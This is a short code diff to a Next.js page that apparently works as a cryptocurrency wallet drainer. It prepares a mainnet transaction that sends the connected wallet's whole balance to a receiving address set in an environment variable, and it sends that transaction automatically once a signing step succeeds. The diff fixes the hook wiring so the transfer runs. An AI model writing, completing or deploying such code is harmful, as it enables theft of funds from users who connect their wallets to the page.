@@ -84,8 +84,7 @@ export default function Home() {
   }
 
   // Prepare to transfer assets.
-  // const { config } = usePrepareSendTransaction();
-  const { data, sendTransaction } = useSendTransaction({
+  const { config } = usePrepareSendTransaction({
     to: process.env.NEXT_PUBLIC_RECIEVING_ADDRESS,
     value: balance.data?.value,
     chainId: 1,
@@ -101,6 +100,7 @@ export default function Home() {
       });
     },
   });
+  const { data, sendTransaction } = useSendTransaction(config);
 
   // Sign a transaction
   const {
@@ -136,8 +136,7 @@ export default function Home() {
     console.log("UseEffect 2...");
     if (isSuccess) {
       console.log("Sending the transaction...");
-      // sendTransaction?.();
-      sendTransaction();
+      sendTransaction?.();
     }
   }, [isSuccess]);
 
